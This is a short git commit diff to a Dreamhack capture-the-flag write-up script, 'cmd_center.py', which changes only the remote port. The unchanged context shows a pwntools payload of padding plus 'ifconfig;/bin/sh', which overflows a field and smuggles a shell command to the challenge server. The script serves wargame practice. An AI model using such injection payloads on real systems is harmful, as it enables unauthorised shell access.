a271062792aca99679a91ba7945d66323e8a2ab6
NULLNULLpersid <persid@cu.ac.kr>
2024-09-05 02:20:29 +0900

    완료

--- System/LEVEL1/cmd_center/Write-up/cmd_center.py
+++ System/LEVEL1/cmd_center/Write-up/cmd_center.py
@@ -3,7 +3,7 @@ from pwn import *
 # center_name + padding + cmd_ip
 payload = b'\x90'*24 + b'\x00'*8 + b'ifconfig;/bin/sh' 
 
-r = remote('host3.dreamhack.games', 13264)
+r = remote('host3.dreamhack.games', 12277)
 
 r.sendline(payload)
 
